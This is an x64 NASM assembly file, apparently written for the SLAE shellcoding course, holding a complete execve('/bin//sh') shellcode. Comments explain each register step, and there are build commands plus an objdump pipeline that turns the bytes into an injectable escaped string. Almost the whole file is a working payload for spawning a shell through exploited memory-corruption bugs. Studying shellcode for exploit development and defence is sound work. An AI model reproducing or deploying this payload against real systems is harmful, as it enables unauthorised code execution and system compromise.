; Filename:      shellcode-execve.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  30.01.2019
; Note:          x64
; Assembler:     nasm -f elf64 shellcode-execve.nasm -o shellcode-execve.o
; Linker:        ld -m elf_x86_64 shellcode-execve.o -o shellcode-execve
; Assembly dump: objdump -d ./shellcode-execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	xor rax, rax                   ; Clear rax register
	push rax                       ; First NULL push
	mov rbx, 0x68732f2f6e69622f    ; /bin//sh in reverse
	push rbx                       ; Push string
	mov rdi, rsp                   ; store /bin//sh address in RDI
	push rax                       ; Second NULL push
	mov rdx, rsp                   ; Set RDX
	push rdi                       ; Push address of /bin//sh
	mov rsi, rsp                   ; set RSI
	add rax, 59                    ; sys_execve
	syscall
